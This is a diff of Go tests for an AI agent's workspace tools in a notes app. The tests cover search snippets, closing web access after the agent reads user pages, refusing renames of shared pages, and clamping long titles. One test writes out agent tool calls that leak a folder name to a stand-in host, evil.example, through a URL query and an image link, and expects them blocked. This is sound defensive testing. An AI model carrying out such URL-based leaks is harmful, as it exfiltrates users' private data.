@@ -13,6 +13,7 @@ import (
 	"testing"
 	"time"
 	"unicode/utf16"
+	"unicode/utf8"
 
 	"leaflet/internal/doc"
 	"leaflet/internal/remote"
@@ -311,6 +312,36 @@ func TestWorkspaceSearchShowsNoTextOfPeoplesPages(t *testing.T) {
 	}
 }
 
+// What a page's sites wrote of its blocks, a link card's title and a
+// video's, is not read through a search either, as read_page leaves it
+// out: the page is found, but the words around a match are its own.
+func TestWorkspaceSearchShowsNoTextOfSites(t *testing.T) {
+	w := newWorkspaceWorld(t)
+	card := &doc.Node{Type: "link_preview", Data: map[string]any{"url": "https://example.com/a", "title": "Kiwi growers, read this first", "description": "Kiwi"}}
+	video := &doc.Node{Type: "video", Data: map[string]any{"url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ", "title": "Kiwi harvest", "notes": "0:00 Picking"}}
+	note := &doc.Node{Type: "paragraph"}
+	note.SetDelta(doc.FromMarkdown("Ask about the kiwi crop."))
+	links, err := w.st.CreatePage(store.NewPageOptions{Title: "Links", Content: doc.FromBlocks([]*doc.Node{card, video})})
+	if err != nil {
+		t.Fatal(err)
+	}
+	notes, err := w.st.CreatePage(store.NewPageOptions{Title: "Notes", Content: doc.FromBlocks([]*doc.Node{card.Clone(), note})})
+	if err != nil {
+		t.Fatal(err)
+	}
+	results, _ := w.executor(true).Call("search_pages", map[string]any{"query": "kiwi"})["results"].([]map[string]any)
+	snippets := map[any]any{}
+	for _, r := range results {
+		snippets[r["page_id"]] = r["snippet"]
+	}
+	if s, found := snippets[links.ID]; !found || s != nil {
+		t.Errorf("found %v, snippet %v", found, s)
+	}
+	if s, _ := snippets[notes.ID].(string); !strings.Contains(s, "Ask about the kiwi crop") || strings.Contains(s, "growers") {
+		t.Errorf("snippet %q", s)
+	}
+}
+
 // With reading off the agent reads none of the user's pages, but makes
 // and files them.
 func TestWorkspaceReadingOffReadsNoPage(t *testing.T) {
@@ -335,7 +366,9 @@ func TestWorkspaceReadingOffReadsNoPage(t *testing.T) {
 
 // Once the agent reads the user's pages, the web is closed to the run,
 // and what it writes keeps to the URLs the user gave: what it read could
-// go out in a request, or in a link the app loads.
+// go out in a request, or in a link the app loads. Listing the folders,
+// with reading on or off, spends its one read of the web that may go to
+// any page: it reads the user's after, and writes the URLs it may.
 func TestWorkspaceWebClosesAfterReadingPages(t *testing.T) {
 	w := newWorkspaceWorld(t)
 	x := w.executor(true)
@@ -353,6 +386,22 @@ func TestWorkspaceWebClosesAfterReadingPages(t *testing.T) {
 	}
 	if out := x.Call("create_page", map[string]any{"title": "B", "blocks": image("https://example.com/given.png")}); out["error"] != nil {
 		t.Errorf("refused the user's URL: %v", out)
+	}
+
+	for _, reading := range []bool{true, false} {
+		x := w.executor(reading)
+		x.Ctx.ReadWeb = func(link string) (web.Page, error) { return web.Page{URL: link, Title: "Page"}, nil }
+		x.Ctx.Request = "Save https://example.com/given.png"
+		x.Call("list_folders", map[string]any{})
+		if out := x.Call("read_web_page", map[string]any{"url": "https://evil.example/?f=Clippings"}); !strings.Contains(toolText(out), "read only a page the user gave") {
+			t.Errorf("reading %v: read a page of the run's own pick after listing the folders: %v", reading, out)
+		}
+		if out := x.Call("create_page", map[string]any{"title": "A", "blocks": image("https://evil.example/x.png")}); out["error"] == nil {
+			t.Errorf("reading %v: wrote a URL the user did not give: %v", reading, out)
+		}
+		if out := x.Call("read_web_page", map[string]any{"url": "https://example.com/given.png"}); out["error"] != nil {
+			t.Errorf("reading %v: refused the user's page: %v", reading, out)
+		}
 	}
 }
 
@@ -815,7 +864,8 @@ func TestWorkspaceMovesKeepTheirCards(t *testing.T) {
 
 // A page whose title someone else reads, as its card is on a page they
 // read, is left as it is, as one shared: renaming it would write there.
-// Its card on a public page shows it, inside a page or pasted elsewhere.
+// Its card on a public page shows it, inside a page or pasted elsewhere,
+// and so does a mention of it, which shows its title as the page opens.
 func TestWorkspaceLeavesPagesWhoseCardsOthersRead(t *testing.T) {
 	w := newWorkspaceWorld(t)
 	guested, err := w.st.CreatePage(store.NewPageOptions{Title: "Guested"})
@@ -833,13 +883,19 @@ func TestWorkspaceLeavesPagesWhoseCardsOthersRead(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
+	mentioned, err := w.st.CreatePage(store.NewPageOptions{Title: "Mentioned"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	mention := &doc.Node{Type: "paragraph"}
+	mention.SetDelta(doc.Delta{{Text: "See "}, {Text: "Mentioned", Attrs: doc.PageMention(mentioned.ID, "Mentioned")}})
 	c := w.st.Content(guested.ID)
-	c.Children = append(c.Children, doc.SubpageNode(pasted.ID))
+	c.Children = append(c.Children, doc.SubpageNode(pasted.ID), mention)
 	if _, _, err := w.st.SaveContent(guested.ID, c); err != nil {
 		t.Fatal(err)
 	}
 	x := w.executor(true)
-	for _, id := range []string{child.ID, pasted.ID} {
+	for _, id := range []string{child.ID, pasted.ID, mentioned.ID} {
 		if out := x.Call("rename_page", map[string]any{"page_id": id, "title": "Secret"}); out["error"] == nil {
 			t.Errorf("renamed %s: %v", id, out)
 		}
@@ -849,7 +905,7 @@ func TestWorkspaceLeavesPagesWhoseCardsOthersRead(t *testing.T) {
 	}
 	listed, _ := x.Call("list_pages", map[string]any{})["pages"].([]map[string]any)
 	for _, p := range listed {
-		if (p["id"] == child.ID || p["id"] == pasted.ID) && p["shared"] != true {
+		if (p["id"] == child.ID || p["id"] == pasted.ID || p["id"] == mentioned.ID) && p["shared"] != true {
 			t.Errorf("listed %v", p)
 		}
 	}
@@ -896,5 +952,56 @@ func TestCloudEditsNameUntitledPages(t *testing.T) {
 	}
 	if res.Ops[3].Content != nil {
 		t.Error("the page made keeps its content in the run")
+	}
+}
+
+// A page's title the agent gives is cut to the most the store keeps of
+// one, as the server cuts it, at a character's boundary: a page made, a
+// subpage and a page renamed carry it so in their ops and edits, and
+// Undo finds the title it gave the page.
+func TestLongTitlesAreCutAsTheStoreKeepsThem(t *testing.T) {
+	long := strings.Repeat("👨‍👩‍👧", 1000)
+	want := store.ClampTitle(long)
+	if n := utf8.RuneCountInString(want); n >= utf8.RuneCountInString(long) || !utf8.ValidString(want) {
+		t.Fatalf("the store keeps %d characters", n)
+	}
+	x := executor(page())
+	var titles []string
+	x.Ctx.CreateSubpage = func(title string, _ []*doc.Node) (string, error) {
+		titles = append(titles, title)
+		return "page-2", nil
+	}
+	x.Ctx.CreatePage = func(title string, _ []*doc.Node, _ string) (string, error) {
+		titles = append(titles, title)
+		return "page-3", nil
+	}
+	for _, tool := range []string{"create_subpage", "create_page"} {
+		if out := x.Call(tool, map[string]any{"title": " " + long + " "}); out["error"] != nil {
+			t.Fatalf("%s: %v", tool, out)
+		}
+	}
+	if !slices.Equal(titles, []string{want, want}) {
+		t.Errorf("made pages titled %d and %d characters", utf8.RuneCountInString(titles[0]), utf8.RuneCountInString(titles[1]))
+	}
+	for _, op := range x.Ops {
+		if op.Op == "create_page" && op.Page.Title != want {
+			t.Errorf("an op titled %d characters", utf8.RuneCountInString(op.Page.Title))
+		}
+	}
+
+	w := newWorkspaceWorld(t)
+	wx := w.executor(true)
+	if out := wx.Call("rename_page", map[string]any{"page_id": w.mine.ID, "title": long}); out["error"] != nil {
+		t.Fatalf("rename_page: %v", out)
+	}
+	if p, _ := w.st.Page(w.mine.ID); p.Title != want || len(wx.Ops) != 1 || wx.Ops[0].Title != want || !strings.Contains(wx.Edits[0].Summary, want) {
+		t.Fatalf("renamed to %d characters, ops %d", utf8.RuneCountInString(p.Title), len(wx.Ops))
+	}
+	w.h.Session(WorkspaceID).Runs = []*Run{{ID: "r1", Status: "done", Local: true, Ops: wx.Ops}}
+	if err := w.h.UndoRun(WorkspaceID, "r1"); err != nil {
+		t.Fatal(err)
+	}
+	if p, _ := w.st.Page(w.mine.ID); p.Title != "Mine" {
+		t.Errorf("after Undo the page is titled %d characters", utf8.RuneCountInString(p.Title))
 	}
 }
